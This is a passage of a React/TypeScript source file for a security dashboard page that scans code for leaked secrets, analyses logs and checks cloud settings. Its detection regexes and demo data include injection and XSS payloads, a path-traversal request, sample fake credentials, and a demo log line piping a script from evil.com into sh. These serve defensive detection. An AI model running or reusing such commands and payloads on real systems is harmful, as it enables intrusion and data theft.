"use client";

import { useState, useCallback } from "react";
import { useSession } from "next-auth/react";
import Link from "next/link";
import { motion, AnimatePresence } from "framer-motion";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import {
  Shield, Key, Package, Cloud, Globe, BarChart3, Brain, ArrowRight,
  CheckCircle2, AlertTriangle, XCircle, Eye, Search,
  Activity, Play, RotateCcw, Loader2,
  GitBranch, Bell, Copy, Check, Terminal, Mail, Code, Send,
  MessageSquare, Settings, ExternalLink, Lock, Crown,
} from "lucide-react";
import {
  RadarChart, Radar, PolarGrid, PolarAngleAxis, PolarRadiusAxis,
  ResponsiveContainer,
} from "recharts";

/* ═══════════════════════════════════════════════════════════
   ███  ENTROPY & CONFIDENCE SCORING  ███
   ═══════════════════════════════════════════════════════════ */

function calculateEntropy(str: string): number {
  if (!str || str.length === 0) return 0;
  const freq: Record<string, number> = {};
  for (const ch of str) freq[ch] = (freq[ch] || 0) + 1;
  const len = str.length;
  let entropy = 0;
  for (const count of Object.values(freq)) {
    const p = count / len;
    entropy -= p * Math.log2(p);
  }
  return entropy;
}

function isPlaceholder(value: string): boolean {
  const lower = value.toLowerCase();
  const placeholders = [
    "your-", "xxx", "todo", "changeme", "replace",
    "insert", "placeholder", "dummy", "fake",
    "secret-here", "key-here", "token-here",
  ];
  return placeholders.some((p) => lower.includes(p));
}

/* ═══════════════════════════════════════════════════════════
   ███  SECRETS SCANNER — 20 PATTERNS + ENTROPY  ███
   ═══════════════════════════════════════════════════════════ */

interface SecretPattern {
  name: string;
  regex: RegExp;
  severity: "critical" | "high" | "medium";
  fix: string;
}

const SECRET_PATTERNS: SecretPattern[] = [
  { name: "AWS Access Key ID", regex: /(?:^|[^A-Za-z0-9/+=])(?:AKIA|ASIA)[0-9A-Z]{16}(?:[^A-Za-z0-9/+=]|$)/gm, severity: "critical", fix: "Rotate the key in AWS IAM Console immediately. Use environment variables or AWS Secrets Manager." },
  { name: "AWS Secret Access Key", regex: /(?:aws_secret_access_key|aws_secret_key|secret_access_key)\s*[=:]\s*["']?([A-Za-z0-9/+=]{40})["']?/gi, severity: "critical", fix: "Rotate in AWS IAM. Never hardcode credentials — use IAM roles or Secrets Manager." },
  { name: "GitHub Token (ghp/gho/ghu/ghs/ghr)", regex: /(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,255}/g, severity: "critical", fix: "Revoke the token at github.com/settings/tokens and generate a new one with minimal scopes." },
  { name: "GitHub Fine-Grained Token", regex: /github_pat_[A-Za-z0-9_]{22,255}/g, severity: "critical", fix: "Revoke at github.com/settings/tokens and regenerate." },
  { name: "Stripe Secret Key", regex: /sk_live_[A-Za-z0-9]{24,}/g, severity: "critical", fix: "Roll the key in Stripe Dashboard → Developers → API Keys. Use env vars." },
  { name: "Stripe Publishable Key", regex: /pk_live_[A-Za-z0-9]{24,}/g, severity: "medium", fix: "Publishable keys are less sensitive but should still not be in source code." },
  { name: "Slack Token", regex: /xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*/g, severity: "high", fix: "Revoke in Slack admin and regenerate. Use env vars." },
  { name: "Slack Webhook URL", regex: /https:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]{8,}\/B[A-Z0-9]{8,}\/[A-Za-z0-9]{24,}/g, severity: "high", fix: "Regenerate webhook in Slack app settings." },
  { name: "Google API Key", regex: /AIza[0-9A-Za-z_-]{35}/g, severity: "high", fix: "Restrict the key in Google Cloud Console or regenerate it." },
  { name: "Private Key (RSA/EC/DSA)", regex: /-----BEGIN\s+(RSA|EC|DSA|OPENSSH|PGP)?\s*PRIVATE KEY-----/g, severity: "critical", fix: "Remove from repo immediately. Regenerate the key pair. Use a secrets vault." },
  { name: "JWT / Bearer Token", regex: /(?:eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})/g, severity: "high", fix: "JWTs should never be hardcoded. Use dynamic token generation." },
  { name: "Generic Password Assignment", regex: /(?:password|passwd|pwd|secret)\s*[=:]\s*["'][^"'\s]{8,}["']/gi, severity: "high", fix: "Remove hardcoded passwords. Use environment variables or a secrets manager." },
  { name: "Database Connection String", regex: /(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis|amqp):\/\/[^\s"']{10,}/gi, severity: "critical", fix: "Move connection strings to env vars or a secrets manager. Rotate the credentials." },
  { name: "SendGrid API Key", regex: /SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}/g, severity: "high", fix: "Revoke and regenerate in SendGrid → Settings → API Keys." },
  { name: "Twilio API Key", regex: /SK[0-9a-fA-F]{32}/g, severity: "high", fix: "Rotate in Twilio Console → API Keys." },
  { name: "Mailgun API Key", regex: /key-[0-9a-zA-Z]{32}/g, severity: "high", fix: "Regenerate in Mailgun Dashboard." },
  { name: "npm Token", regex: /npm_[A-Za-z0-9]{36}/g, severity: "critical", fix: "Revoke with `npm token revoke`. Create new token with minimal permissions." },
  { name: "Docker Hub Token", regex: /dckr_pat_[A-Za-z0-9_-]{20,}/g, severity: "high", fix: "Regenerate in Docker Hub → Account Settings → Security." },
  { name: "Generic API Key Pattern", regex: /(?:api[_-]?key|apikey|api[_-]?secret)\s*[=:]\s*["']([A-Za-z0-9_\-]{20,})["']/gi, severity: "high", fix: "Move API keys to environment variables. Never commit secrets to source control." },
  { name: "Hardcoded IP Address (Internal)", regex: /(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})/g, severity: "medium", fix: "Internal IPs expose network architecture. Use DNS or config files." },
];

interface SecretFinding {
  pattern: string;
  severity: "critical" | "high" | "medium";
  line: number;
  match: string;
  fix: string;
  entropy: number;
  confidence: "high" | "medium" | "low";
}

function scanSecrets(code: string): SecretFinding[] {
  const findings: SecretFinding[] = [];
  const lines = code.split("\n");
  const seen = new Set<string>();

  for (const pattern of SECRET_PATTERNS) {
    for (let i = 0; i < lines.length; i++) {
      const matches = lines[i].matchAll(new RegExp(pattern.regex));
      for (const m of matches) {
        const rawMatch = m[0];
        const matchText = rawMatch.length > 60 ? rawMatch.slice(0, 57) + "..." : rawMatch;
        const key = `${pattern.name}:${i}:${matchText}`;
        if (seen.has(key)) continue;
        seen.add(key);

        const secretValue = m[1] || rawMatch;
        const entropy = calculateEntropy(secretValue.trim());
        const placeholder = isPlaceholder(rawMatch);

        let confidence: "high" | "medium" | "low" = "high";
        if (placeholder) confidence = "low";
        else if (entropy < 2.0) confidence = "low";
        else if (entropy < 3.0) confidence = "medium";

        findings.push({
          pattern: pattern.name,
          severity: pattern.severity,
          line: i + 1,
          match: matchText.trim(),
          fix: pattern.fix,
          entropy: Math.round(entropy * 100) / 100,
          confidence,
        });
      }
    }
  }
  return findings;
}

/* ═══════════════════════════════════════════════════════════
   ███  DEPENDENCY SCANNER — OSV.dev API  ███
   ═══════════════════════════════════════════════════════════ */

interface OsvVuln {
  id: string;
  package: string;
  version: string;
  severity: "critical" | "high" | "medium" | "low";
  summary: string;
  details: string;
  aliases: string[];
  references: string[];
  fixedIn: string;
  source: string;
}

interface DepsApiResult {
  ecosystem: string;
  totalDeps: number;
  scannedPackages: number;
  vulnerabilities: OsvVuln[];
  stats: { critical: number; high: number; medium: number; low: number };
  errors?: string[];
  scannedAt: string;
  source: string;
}

/* ═══════════════════════════════════════════════════════════
   ███  CLOUD CONFIG SCANNER — REAL CHECKLIST ENGINE  ███
   ═══════════════════════════════════════════════════════════ */

interface CloudCheck {
  id: string;
  category: string;
  platform: "AWS" | "GCP" | "Azure" | "General";
  question: string;
  severity: "critical" | "high" | "medium" | "low";
  failMessage: string;
  passMessage: string;
  fix: string;
}

const CLOUD_CHECKS: CloudCheck[] = [
  { id: "s3-public", category: "Storage", platform: "AWS", question: "Are all S3 buckets set to private (no public access)?", severity: "critical", failMessage: "Public S3 buckets can expose sensitive data", passMessage: "S3 buckets are properly restricted", fix: "Enable S3 Block Public Access at account level. Review bucket policies." },
  { id: "iam-mfa", category: "Identity", platform: "AWS", question: "Is MFA enabled for all IAM users (especially root)?", severity: "critical", failMessage: "IAM accounts without MFA are vulnerable to credential theft", passMessage: "MFA is enabled for IAM users", fix: "Enable MFA for all IAM users in AWS Console → IAM → Users → Security Credentials." },
  { id: "iam-roles", category: "Identity", platform: "AWS", question: "Do IAM roles follow least privilege (no AdministratorAccess)?", severity: "high", failMessage: "Overly permissive IAM roles increase blast radius", passMessage: "IAM roles follow least privilege", fix: "Audit IAM policies. Replace AdministratorAccess with specific service permissions." },
  { id: "rds-public", category: "Database", platform: "AWS", question: "Are RDS/database instances NOT publicly accessible?", severity: "critical", failMessage: "Publicly accessible databases can be exploited", passMessage: "Databases are not publicly accessible", fix: "Set PubliclyAccessible=false. Use VPC security groups to restrict access." },
  { id: "rds-encrypted", category: "Database", platform: "AWS", question: "Is encryption at rest enabled for all databases?", severity: "high", failMessage: "Unencrypted databases risk data exposure if storage is compromised", passMessage: "Database encryption at rest is enabled", fix: "Enable encryption at rest for RDS instances. Use AWS KMS for key management." },
  { id: "vpc-flow", category: "Network", platform: "AWS", question: "Are VPC Flow Logs enabled?", severity: "medium", failMessage: "Without flow logs, you cannot audit network traffic", passMessage: "VPC Flow Logs are enabled", fix: "Enable VPC Flow Logs in VPC Console → Flow Logs → Create flow log." },
  { id: "sg-open", category: "Network", platform: "AWS", question: "Are security groups restricted (no 0.0.0.0/0 on SSH/RDP)?", severity: "critical", failMessage: "Open SSH/RDP to the internet enables brute force attacks", passMessage: "Security groups properly restrict access", fix: "Remove 0.0.0.0/0 rules for ports 22/3389. Use VPN or bastion hosts instead." },
  { id: "cloudtrail", category: "Logging", platform: "AWS", question: "Is CloudTrail enabled for all regions?", severity: "high", failMessage: "Without CloudTrail you cannot audit API activity", passMessage: "CloudTrail is enabled across all regions", fix: "Enable CloudTrail in all regions with S3 log delivery and SNS notifications." },
  { id: "gcs-public", category: "Storage", platform: "GCP", question: "Are GCS buckets private (no allUsers/allAuthenticatedUsers)?", severity: "critical", failMessage: "Public GCS buckets expose data to the internet", passMessage: "GCS buckets are properly restricted", fix: "Remove allUsers and allAuthenticatedUsers from bucket IAM. Use uniform bucket-level access." },
  { id: "gcp-sa", category: "Identity", platform: "GCP", question: "Are service account keys rotated and minimal?", severity: "high", failMessage: "Stale service account keys are a major attack vector", passMessage: "Service account keys are managed properly", fix: "Prefer Workload Identity. If keys are required, rotate every 90 days." },
  { id: "gcp-audit", category: "Logging", platform: "GCP", question: "Is Cloud Audit Logging enabled for all services?", severity: "medium", failMessage: "Insufficient audit logging hinders incident response", passMessage: "Audit logging is properly configured", fix: "Enable Data Access audit logs for critical services in IAM → Audit Logs." },
  { id: "azure-nsg", category: "Network", platform: "Azure", question: "Are NSGs configured with no open RDP/SSH to internet?", severity: "critical", failMessage: "Open RDP/SSH enables brute force attacks", passMessage: "NSGs properly restrict remote access", fix: "Remove Any/Any rules for ports 22/3389. Use Azure Bastion for remote access." },
  { id: "azure-storage", category: "Storage", platform: "Azure", question: "Are storage accounts NOT allowing anonymous blob access?", severity: "critical", failMessage: "Anonymous blob access can expose sensitive files", passMessage: "Storage accounts properly restrict access", fix: "Disable anonymous access in Storage Account → Configuration → Blob anonymous access: Disabled." },
  { id: "azure-keyvault", category: "Secrets", platform: "Azure", question: "Are secrets stored in Key Vault (not in app config)?", severity: "high", failMessage: "Secrets in app config can be leaked via source control or logs", passMessage: "Secrets are managed through Key Vault", fix: "Migrate secrets to Azure Key Vault. Use managed identities for access." },
  { id: "https-only", category: "Network", platform: "General", question: "Is HTTPS enforced everywhere (no HTTP fallback)?", severity: "high", failMessage: "HTTP allows traffic interception and MITM attacks", passMessage: "HTTPS is enforced", fix: "Force HTTPS redirects. Use HSTS headers with long max-age." },
  { id: "encryption-transit", category: "Encryption", platform: "General", question: "Is encryption in transit (TLS 1.2+) enforced?", severity: "high", failMessage: "Old TLS versions have known vulnerabilities", passMessage: "TLS 1.2+ is enforced", fix: "Disable TLS 1.0/1.1. Configure TLS 1.2 minimum on all services." },
  { id: "logging-central", category: "Logging", platform: "General", question: "Is centralized logging configured?", severity: "medium", failMessage: "Decentralized logs are hard to monitor and correlate", passMessage: "Centralized logging is configured", fix: "Use CloudWatch, Stackdriver, or a SIEM to aggregate all logs." },
  { id: "backup", category: "Data", platform: "General", question: "Are automated backups configured and tested?", severity: "high", failMessage: "Without tested backups, data loss is unrecoverable", passMessage: "Backups are properly configured", fix: "Enable automated backups. Test restoration quarterly." },
];

/* ═══════════════════════════════════════════════════════════
   ███  AI LOG ANALYZER — REAL PATTERN ENGINE  ███
   ═══════════════════════════════════════════════════════════ */

interface LogFinding {
  type: string;
  severity: "critical" | "high" | "medium" | "low";
  details: string;
  evidence: string;
  fix: string;
}

function analyzeLogs(input: string): LogFinding[] {
  const findings: LogFinding[] = [];
  const lines = input.split("\n");
  const seen = new Set<string>();

  const failedLogins: { line: number; text: string }[] = [];
  const failedPatterns = /(?:failed\s+login|authentication\s+failed|login\s+failed|invalid\s+(?:password|credentials)|unauthorized|401|access\s+denied|permission\s+denied)/gi;
  for (let i = 0; i < lines.length; i++) {
    if (failedPatterns.test(lines[i])) failedLogins.push({ line: i + 1, text: lines[i].trim() });
    failedPatterns.lastIndex = 0;
  }
  if (failedLogins.length >= 3) {
    findings.push({
      type: "Brute Force Attempt",
      severity: "critical",
      details: `${failedLogins.length} failed login attempts detected — possible brute force attack`,
      evidence: failedLogins.slice(0, 3).map((f) => `Line ${f.line}: ${f.text.slice(0, 100)}`).join("\n"),
      fix: "Implement rate limiting, account lockout after 5 failed attempts, and notify the user.",
    });
  } else if (failedLogins.length > 0) {
    findings.push({
      type: "Failed Authentication",
      severity: "medium",
      details: `${failedLogins.length} failed login attempt(s) detected`,
      evidence: failedLogins.map((f) => `Line ${f.line}: ${f.text.slice(0, 100)}`).join("\n"),
      fix: "Monitor for patterns. Implement account lockout and alerting.",
    });
  }

  const ipPattern = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g;
  const ipCounts: Record<string, number> = {};
  for (const line of lines) {
    const ips = line.matchAll(ipPattern);
    for (const ip of ips) {
      const addr = ip[1];
      if (addr.startsWith("127.") || addr.startsWith("0.") || addr === "255.255.255.255") continue;
      ipCounts[addr] = (ipCounts[addr] || 0) + 1;
    }
  }
  const suspiciousIps = Object.entries(ipCounts).filter(([, count]) => count >= 5).sort((a, b) => b[1] - a[1]);
  if (suspiciousIps.length > 0) {
    findings.push({
      type: "High-Frequency IP Activity",
      severity: "high",
      details: `${suspiciousIps.length} IP(s) with abnormally high request frequency`,
      evidence: suspiciousIps.slice(0, 5).map(([ip, count]) => `${ip} — ${count} occurrences`).join("\n"),
      fix: "Investigate these IPs. Block if malicious. Implement IP-based rate limiting.",
    });
  }

  const timePattern = /\b(\d{2}):(\d{2})(?::(\d{2}))?\b/g;
  let offHoursCount = 0;
  for (const line of lines) {
    const times = line.matchAll(timePattern);
    for (const t of times) {
      const hour = parseInt(t[1]);
      if (hour >= 0 && hour <= 5) offHoursCount++;
    }
  }
  if (offHoursCount >= 3) {
    findings.push({
      type: "Off-Hours Activity",
      severity: "medium",
      details: `${offHoursCount} events detected between 00:00–05:59 (potential unauthorized access)`,
      evidence: `${offHoursCount} log entries with timestamps in early morning hours`,
      fix: "Review if these actions are expected. Implement alerts for off-hours admin activity.",
    });
  }

  const injectionPatterns = /(?:union\s+select|or\s+1\s*=\s*1|drop\s+table|<script>|alert\s*\(|onerror\s*=|onclick\s*=|eval\s*\(|exec\s*\(|cmd\s*=|system\s*\(|\.\.\/\.\.\/)/gi;
  const injectionLines: number[] = [];
  for (let i = 0; i < lines.length; i++) {
    if (injectionPatterns.test(lines[i])) injectionLines.push(i + 1);
    injectionPatterns.lastIndex = 0;
  }
  if (injectionLines.length > 0) {
    findings.push({
      type: "Injection Attack Patterns",
      severity: "critical",
      details: `${injectionLines.length} log entries contain SQL injection or XSS payloads`,
      evidence: `Lines: ${injectionLines.slice(0, 10).join(", ")}`,
      fix: "This indicates active attack attempts. Verify WAF is active. Audit input validation. Check if any attacks succeeded.",
    });
  }

  const privEsc = /(?:sudo|su\s+-|chmod\s+777|chown\s+root|adduser|useradd|usermod.*admin|grant\s+all|alter\s+user|role.*admin)/gi;
  const privLines: number[] = [];
  for (let i = 0; i < lines.length; i++) {
    if (privEsc.test(lines[i])) privLines.push(i + 1);
    privEsc.lastIndex = 0;
  }
  if (privLines.length > 0) {
    findings.push({
      type: "Privilege Escalation Activity",
      severity: "high",
      details: `${privLines.length} privilege modification commands detected`,
      evidence: `Lines: ${privLines.slice(0, 10).join(", ")}`,
      fix: "Verify these are authorized changes. Implement approval workflows for privilege changes.",
    });
  }

  const exfilPatterns = /(?:curl\s+.*\|.*sh|wget\s+.*-O|nc\s+-.*\d{1,3}\.\d{1,3}|base64\s+.*\||scp\s+|rsync\s+.*@|s3\s+cp\s+s3:)/gi;
  for (let i = 0; i < lines.length; i++) {
    if (exfilPatterns.test(lines[i])) {
      const key = "exfil";
      if (!seen.has(key)) {
        seen.add(key);
        findings.push({
          type: "Potential Data Exfiltration",
          severity: "critical",
          details: "Commands associated with data transfer/exfiltration detected",
          evidence: `Line ${i + 1}: ${lines[i].trim().slice(0, 120)}`,
          fix: "Investigate immediately. Check for unauthorized data transfers. Review DLP policies.",
        });
      }
    }
    exfilPatterns.lastIndex = 0;
  }

  const errorPatterns = /(?:error|exception|fatal|panic|segfault|crash|oom|killed)/gi;
  let errorCount = 0;
  for (const line of lines) {
    if (errorPatterns.test(line)) errorCount++;
    errorPatterns.lastIndex = 0;
  }
  if (errorCount >= 5) {
    findings.push({
      type: "Error Spike",
      severity: "medium",
      details: `${errorCount} error/exception entries detected — possible instability or DoS`,
      evidence: `${errorCount} error-related log entries`,
      fix: "Investigate root cause. High error rates can indicate attacks or system failures.",
    });
  }

  return findings;
}

/* ═══════════════════════════════════════════════════════════
   ███  SECURITY SCORE CALCULATOR  ███
   ═══════════════════════════════════════════════════════════ */

interface ScanResults {
  secrets: SecretFinding[];
  depsVulns: OsvVuln[];
  depTotal: number;
  cloudAnswers: Record<string, boolean | null>;
  apiScore: number | null;
  logFindings: LogFinding[];
}

function calculateScores(results: ScanResults) {
  const significantSecrets = results.secrets.filter((f) => f.confidence !== "low");
  const secretsPenalty = significantSecrets.reduce((sum, f) => sum + (f.severity === "critical" ? 3 : f.severity === "high" ? 2 : 1), 0);
  const secretsScore = Math.max(0, 10 - secretsPenalty);

  const depPenalty = results.depsVulns.reduce((sum, v) => sum + (v.severity === "critical" ? 3 : v.severity === "high" ? 2 : 1), 0);
  const depsScore = results.depTotal > 0 ? Math.max(0, 10 - depPenalty) : 5;

  const answered = Object.entries(results.cloudAnswers).filter(([, v]) => v !== null);
  const passed = answered.filter(([, v]) => v === true).length;
  const cloudScore = answered.length > 0 ? Math.round((passed / answered.length) * 10 * 10) / 10 : 5;

  const apiScore = results.apiScore ?? 5;

  const logPenalty = results.logFindings.reduce((sum, f) => sum + (f.severity === "critical" ? 3 : f.severity === "high" ? 2 : f.severity === "medium" ? 1 : 0.5), 0);
  const logsScore = Math.max(0, 10 - logPenalty);

  const overall = Math.round(((secretsScore + depsScore + cloudScore + apiScore + logsScore) / 5) * 10) / 10;

  return { secrets: secretsScore, deps: depsScore, cloud: cloudScore, api: apiScore, logs: logsScore, overall };
}

/* ═══════════════════════════════════════════════════════════
   ███  CI/CD PIPELINE TEMPLATES  ███
   ═══════════════════════════════════════════════════════════ */

const GITHUB_ACTIONS_YAML = `name: ShieldX Security Scan
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: ShieldX Secrets Scan
        run: |
          CODE=$(find src -name '*.ts' -o -name '*.js' | head -50 | xargs cat)
          RESULT=$(curl -sf -X POST \\
            https://securecodereviews.com/api/shieldx/ci-scan \\
            -H "Content-Type: application/json" \\
            -d "{\\"scanType\\": \\"secrets\\", \\"code\\": $(echo "$CODE" | jq -Rs .), \\"projectName\\": \\"\${{ github.repository }}\\"}")
          echo "$RESULT" | jq .
          echo "$RESULT" | jq -e '.exitCode == 0'

      - name: ShieldX Dependency Scan
        run: |
          RESULT=$(curl -sf -X POST \\
            https://securecodereviews.com/api/shieldx/ci-scan \\
            -H "Content-Type: application/json" \\
            -d "{\\"scanType\\": \\"dependencies\\", \\"dependencies\\": $(cat package.json | jq -Rs .), \\"projectName\\": \\"\${{ github.repository }}\\"}")
          echo "$RESULT" | jq .
          echo "$RESULT" | jq -e '.exitCode == 0'`;

const GITLAB_CI_YAML = `shieldx-security-scan:
  stage: test
  image: curlimages/curl:latest
  script:
    - |
      CODE=$(find src -name '*.ts' -o -name '*.js' | head -50 | xargs cat)
      RESULT=$(curl -sf -X POST \\
        https://securecodereviews.com/api/shieldx/ci-scan \\
        -H "Content-Type: application/json" \\
        -d "{\\"scanType\\": \\"secrets\\", \\"code\\": $(echo "$CODE" | jq -Rs .), \\"projectName\\": \\"$CI_PROJECT_NAME\\"}")
      echo "$RESULT" | jq .
      echo "$RESULT" | jq -e '.exitCode == 0'
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
    - if: '$CI_COMMIT_BRANCH == "main"'`;

const CURL_EXAMPLE = `# Secrets scan
curl -X POST https://securecodereviews.com/api/shieldx/ci-scan \\
  -H "Content-Type: application/json" \\
  -d '{
    "scanType": "secrets",
    "code": "const API_KEY = \\"sk_live_4eC39HqLyjWDarjtT1zdp7dc\\";",
    "projectName": "my-project"
  }'

# Dependency scan
curl -X POST https://securecodereviews.com/api/shieldx/ci-scan \\
  -H "Content-Type: application/json" \\
  -d '{
    "scanType": "dependencies",
    "dependencies": "{\\"dependencies\\": {\\"lodash\\": \\"4.17.20\\"}}",
    "projectName": "my-project"
  }'`;

/* ═══════════════════════════════════════════════════════════
   ███  DEMO DATA  ███
   ═══════════════════════════════════════════════════════════ */

const DEMO_CODE = `// config/database.ts
const config = {
  database: "mongodb+srv://admin:SuperSecretPass123@cluster0.abc123.mongodb.net/production",
  aws_access_key_id: "AKIAIOSFODNN7EXAMPLE",
  aws_secret_access_key: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  stripe_key: "sk_live_4eC39HqLyjWDarjtT1zdp7dc",
  github_token: "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij",
  jwt_secret: "my-super-secret-jwt-key-12345678",
  password: "admin123!@#",
  api_key: "AIzaSyBxSfGkE6vP3Q2xN8R1j5t7u9w0yAcBdEf",
  sendgrid: "SG.abcdefghijklmnopqrstuv.wxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678",
};

// Internal API endpoint
const API_BASE = "http://10.0.1.50:3000/api";

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGcY5unA...
-----END RSA PRIVATE KEY-----
`;

const DEMO_PACKAGE_JSON = `{
  "name": "fintech-app",
  "version": "1.0.0",
  "dependencies": {
    "express": "4.17.1",
    "lodash": "4.17.20",
    "axios": "0.21.4",
    "jsonwebtoken": "8.5.1",
    "moment": "2.29.1",
    "node-fetch": "2.6.1",
    "qs": "6.9.4",
    "json5": "2.2.0",
    "tar": "6.1.0",
    "minimatch": "3.0.4",
    "semver": "7.3.5",
    "shell-quote": "1.7.2"
  },
  "devDependencies": {
    "webpack-dev-middleware": "5.3.0"
  }
}`;

const DEMO_LOGS = `2026-03-14 01:12:33 [WARN] Failed login attempt for user admin from 185.143.223.47
2026-03-14 01:12:35 [WARN] Failed login attempt for user admin from 185.143.223.47
2026-03-14 01:12:36 [WARN] Failed login attempt for user admin from 185.143.223.47
2026-03-14 01:12:38 [WARN] Failed login attempt for user admin from 185.143.223.47
2026-03-14 01:12:40 [WARN] Failed login attempt for user admin from 185.143.223.47
2026-03-14 01:12:42 [WARN] Failed login attempt for user root from 185.143.223.47
2026-03-14 01:12:44 [WARN] Failed login attempt for user admin from 91.234.56.78
2026-03-14 01:13:01 [ERROR] Authentication failed for API key from 185.143.223.47
2026-03-14 02:30:15 [INFO] Request: GET /api/users?id=1 OR 1=1 from 45.33.32.156
2026-03-14 02:30:16 [INFO] Request: GET /search?q=<script>alert(document.cookie)</script> from 45.33.32.156
2026-03-14 02:31:00 [WARN] 403 Access denied for path ../../etc/passwd from 45.33.32.156
2026-03-14 03:15:22 [INFO] sudo su - root executed by user deploy
2026-03-14 03:15:45 [INFO] chmod 777 /var/www/html/uploads executed by user deploy
2026-03-14 03:22:10 [ERROR] OutOfMemoryError in worker-3
2026-03-14 03:22:11 [FATAL] Application crash: segfault in module auth
2026-03-14 03:22:12 [ERROR] exception in request handler: NullPointerException
2026-03-14 03:22:15 [ERROR] panic: runtime error: index out of range
2026-03-14 03:22:20 [ERROR] fatal error: concurrent map writes
2026-03-14 04:00:00 [INFO] curl http://evil.com/exfil.sh | sh executed from 10.0.1.15
2026-03-14 04:01:00 [INFO] aws s3 cp s3://production-backup/dump.sql /tmp/ from 10.0.1.15`;

const DEMO_API_URL = "https://securecodereviews.com";

const DEMO_CLOUD_ANSWERS: Record<string, boolean> = {
  "s3-public": false,
  "iam-mfa": true,
  "iam-roles": false,
  "rds-public": false,
  "rds-encrypted": true,
  "vpc-flow": false,
  "sg-open": false,
  "cloudtrail": true,
  "gcs-public": true,
  "gcp-sa": false,
  "gcp-audit": true,
  "azure-nsg": true,
  "azure-storage": false,
  "azure-keyvault": false,
  "https-only": true,
  "encryption-transit": true,
  "logging-central": false,
  "backup": true,
};

/* ═══════════════════════════════════════════════════════════
   ███  ALERT RULES  ███
   ═══════════════════════════════════════════════════════════ */

interface AlertRule {
  id: string;
  name: string;
  description: string;
  severity: "critical" | "high" | "medium";
  enabled: boolean;
}

const DEFAULT_ALERT_RULES: AlertRule[] = [
  { id: "secrets-critical", name: "Critical Secrets Detected", description: "Alert when high-confidence critical secrets are found in code", severity: "critical", enabled: true },
  { id: "deps-critical", name: "Critical CVE in Dependencies", description: "Alert when critical severity CVEs are found via OSV.dev", severity: "critical", enabled: true },
  { id: "cloud-failures", name: "Cloud Security Failures", description: "Alert when more than 3 cloud security checks fail", severity: "high", enabled: true },
  { id: "api-low-score", name: "Low API Security Score", description: "Alert when API endpoint scores below 5/10", severity: "high", enabled: true },
  { id: "injection-detected", name: "Injection Attacks in Logs", description: "Alert when SQL injection or XSS patterns detected in logs", severity: "critical", enabled: true },
  { id: "brute-force", name: "Brute Force Attempts", description: "Alert when brute force login patterns are detected", severity: "high", enabled: false },
];

/* ═══════════════════════════════════════════════════════════
   ███  MAIN SHIELDX PAGE  ███
   ═══════════════════════════════════════════════════════════ */

type TabKey = "secrets" | "deps" | "cloud" | "api" | "logs" | "cicd" | "alerts" | "score";

const TABS: { key: TabKey; label: string; icon: typeof Shield; proOnly?: boolean }[] = [
  { key: "secrets", label: "Secrets Scanner", icon: Key },
  { key: "deps", label: "Dependency Scanner", icon: Package, proOnly: true },
  { key: "cloud", label: "Cloud Security", icon: Cloud, proOnly: true },
  { key: "api", label: "API Scanner", icon: Globe, proOnly: true },
  { key: "logs", label: "Log Analyzer", icon: Brain, proOnly: true },
  { key: "cicd", label: "CI/CD Integration", icon: GitBranch, proOnly: true },
  { key: "alerts", label: "Alerts", icon: Bell, proOnly: true },
  { key: "score", label: "Security Score", icon: BarChart3 },
];

export default function ShieldXPage() {
  const { data: session } = useSession();
  const userPlan = (session?.user as { shieldxPlan?: string })?.shieldxPlan || "free";
  const isAdmin = (session?.user as { role?: string })?.role === "admin";
  const hasPro = userPlan === "pro" || userPlan === "enterprise" || isAdmin;

  const [activeTab, setActiveTab] = useState<TabKey>("secrets");
  const [isDemo, setIsDemo] = useState(false);

  // Secrets state
  const [secretsInput, setSecretsInput] = useState("");
  const [secretsResults, setSecretsResults] = useState<SecretFinding[] | null>(null);
  const [secretsScanning, setSecretsScanning] = useState(false);

  // Deps state (OSV API)
  const [depsInput, setDepsInput] = useState("");
  const [depsResults, setDepsResults] = useState<DepsApiResult | null>(null);
  const [depsScanning, setDepsScanning] = useState(false);
  const [depsError, setDepsError] = useState("");

  // Cloud state
  const [cloudAnswers, setCloudAnswers] = useState<Record<string, boolean | null>>(() => {
    const init: Record<string, boolean | null> = {};
    CLOUD_CHECKS.forEach((c) => (init[c.id] = null));
    return init;
  });

  // API state
  const [apiUrl, setApiUrl] = useState("");
  const [apiResults, setApiResults] = useState<{
    url: string; status: number;
    headers: { name: string; present: boolean; value: string | null; severity: string; status: string; message: string }[];
    apiChecks: { name: string; severity: string; status: string; message: string; owaspRef?: string }[];
    score: number;
    owaspCoverage?: string[];
    totalChecks?: number;
    scannedAt?: string;
  } | null>(null);
  const [apiScanning, setApiScanning] = useState(false);
  const [apiError, setApiError] = useState("");

  // Logs state
  const [logsInput, setLogsInput] = useState("");
  const [logsResults, setLogsResults] = useState<LogFinding[] | null>(null);
  const [logsScanning, setLogsScanning] = useState(false);

  // CI/CD state
  const [copiedSnippet, setCopiedSnippet] = useState<string | null>(null);
  const [cicdTestResult, setCicdTestResult] = useState<{ verdict: string; exitCode: number; secrets?: { totalFindings: number }; dependencies?: { totalVulnerabilities: number } } | null>(null);
  const [cicdTesting, setCicdTesting] = useState(false);

  // Alerts state
  const [alertEmail, setAlertEmail] = useState("");
  const [alertSlackWebhook, setAlertSlackWebhook] = useState("");
